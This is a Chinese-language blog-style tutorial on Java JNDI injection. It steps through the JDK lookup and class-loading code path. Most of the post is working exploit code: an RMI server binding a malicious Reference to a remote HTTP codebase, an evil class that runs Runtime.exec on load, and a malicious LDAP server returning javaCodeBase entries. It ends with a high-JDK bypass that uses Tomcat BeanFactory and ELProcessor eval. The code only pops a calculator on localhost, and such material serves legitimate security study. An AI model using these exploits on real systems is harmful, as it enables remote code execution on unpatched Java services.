# 写在前面
[https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/](https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/)
依旧感谢这位大师傅，太菜了，求带。


# 简要
JNDI (Java Naming and Directory Interface) 是 Java 提供的一套用于访问命名和目录服务的 API。它提供了一种统一的方式来访问各种不同的命名和目录服务，例如 DNS、LDAP、NIS 和文件系统等。
JNDI 主要用于在分布式环境中查找和访问命名和目录服务中的对象，例如查找数据库连接、访问企业命名服务 (如 LDAP) 中的用户信息等。它可以将这些服务抽象为一个层次结构的命名空间，通过命名和上下文的方式来访问和管理这些服务。
通过 JNDI，开发人员可以使用统一的 API 来访问各种不同的命名和目录服务，而无需关心底层实现的细节。它提供了一些核心接口和类，例如 Context、InitialContext 和 NamingEnumeration 等，用于执行查找、绑定、解绑和遍历等操作。
JNDI 在企业级应用程序开发中广泛使用，特别是与 Java EE (Enterprise Edition) 相关的应用程序。它为开发人员提供了一种标准化和可扩展的方式来访问和管理分布式环境中的命名和目录服务，提高了应用程序的灵活性和可移植性。
大概就是设置一下访问路径之类的。

JNDI服务：
RMI
LDAP
DNS
CORBA
JNDI Reference

# 建立项目
首先把rmi的服务端配置好，把那些文件直接搬到项目里面开启就行。
然后创建一个JNDIRMIserver服务：
```c
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;

public class JNDIRMIServer {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext=new InitialContext();
        Reference refObj=new Reference("evilref","evilref","http://localhost:8000/");
        initialContext.rebind("rmi://localhost:1099/remoteobj",refObj);
    }
}
```
首先创建一个初始化上下文对象，根据配置文件或系统属性来确定要使用的命名和目录服务提供者。
然后获取一个恶意类，前面是类名，后面是地址，最后将其绑定到特定端口，这个端口是rmi服务的端口。
然后准备恶意类。
```c
import java.io.IOException;

public class evilref {
    static{

        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
注意，这里的恶意类一定不要放在包里生成，否则会出现无法找到类名的报错。
记得先在保存类的目录里面开启http服务，指定之前对应的8000端口
命令行输入：
```c
python -m http.server
```
然后就是JNDI客户端
```c
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JNDIRMIClient {
    public static void main(String[] args) throws NamingException {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        InitialContext initialContext=new InitialContext();
        initialContext.lookup("rmi://localhost:7788/remoteobj");
    }
}
```
然后就弹计算机了。
# 调试分析
look up 处下断点
```c
 initialContext.lookup("rmi://localhost:7788/remoteobj");
```
进入lookup
```c
public Object lookup(String name) throws NamingException {
        return getURLOrDefaultInitCtx(name).lookup(name);
    }
```
再进去
```c
public Object lookup(String var1) throws NamingException {
        ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);
        Context var3 = (Context)var2.getResolvedObj();

        Object var4;
        try {
            var4 = var3.lookup(var2.getRemainingName());
        } finally {
            var3.close();
        }

        return var4;
    }
```
```c
public Object lookup(Name var1) throws NamingException {
        if (var1.isEmpty()) {
            return new RegistryContext(this);
        } else {
            Remote var2;
            try {
                var2 = this.registry.lookup(var1.get(0));
            } catch (NotBoundException var4) {
                throw new NameNotFoundException(var1.get(0));
            } catch (RemoteException var5) {
                throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
            }

            return this.decodeObject(var2, var1.getPrefix(1));
        }
    }
```
跟进decodeObject
```c
private Object decodeObject(Remote var1, Name var2) throws NamingException {
        try {
            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
            Reference var8 = null;
            if (var3 instanceof Reference) {
                var8 = (Reference)var3;
            } else if (var3 instanceof Referenceable) {
                var8 = ((Referenceable)((Referenceable)var3)).getReference();
            }

            if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
                throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");
            } else {
                return NamingManager.getObjectInstance(var3, var2, this, this.environment);
            }
        } catch (NamingException var5) {
            throw var5;
        } catch (RemoteException var6) {
            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
        } catch (Exception var7) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var7);
            throw var4;
        }
    }
```
里面有个
```c
 return NamingManager.getObjectInstance(var3, var2, this, this.environment);
```
跟进去
```c
if (ref != null) {
            String f = ref.getFactoryClassName();
            if (f != null) {
                // if reference identifies a factory, use exclusively

                factory = getObjectFactoryFromReference(ref, f);
```
跟进去getObjectFactoryFromReference。
```c
static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName)
        throws IllegalAccessException,
        InstantiationException,
        MalformedURLException {
        Class<?> clas = null;

        // Try to use current class loader
        try {
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.

        // Not in class path; try to use codebase
        String codebase;
        if (clas == null &&
                (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {
            }
        }

        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }
```
触发loadclass,加载恶意类。
```c
ClassLoader parent = getContextClassLoader();
        ClassLoader cl =
                 URLClassLoader.newInstance(getUrlArray(codebase), parent);

```
反射创建实例弹计算器。

# ldap
ldap服务呢，可以把ldap理解为一个储存协议的数据库，它分为DN DC CN OU四个部分

树层次分为以下几层：
dn：一条记录的详细位置，由以下几种属性组成
dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库）
ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支）
cn/uid：一条记录的名字/ID（树的叶节点的编号，想到与MYSQL的表主键？）
## LDAP服务
```c
<dependency>
        <groupId>com.unboundid</groupId>
        <artifactId>unboundid-ldapsdk</artifactId>
        <version>3.1.1</version>
    </dependency>
```
起服务：
```c
package LDAP;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LDAP_Server {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1:8888/#EXP"};
        int port = 9999;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```
## jndi服务器
```c
import javax.naming.InitialContext;

public class JNDI_LDAP {
    public static void main(String[]args) throws Exception{
        String string = "ldap://localhost:9999/EXP";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(string);
    }
}
```
弹计算器。

# 高版本绕过
payload放服务端
```c
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext initialContext=new InitialContext();
        //Reference refObj=new Reference("evilref","evilref","http://localhost:8000/");
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec('calc')"));
        //initialContext.rebind("ldap://localhost:10389/cn=TestLdap,dc=example,dc=com",ref);
        initialContext.rebind("rmi://localhost:7788/remoteobj",ref);
    }
}
```
客户端
```c
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JNDIRMIClient {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext=new InitialContext();
        //initialContext.lookup("ldap://localhost:10389/cn=TestLdap,dc=example,dc=com");
        initialContext.lookup("rmi://localhost:7788/remoteobj");
    }
}

```
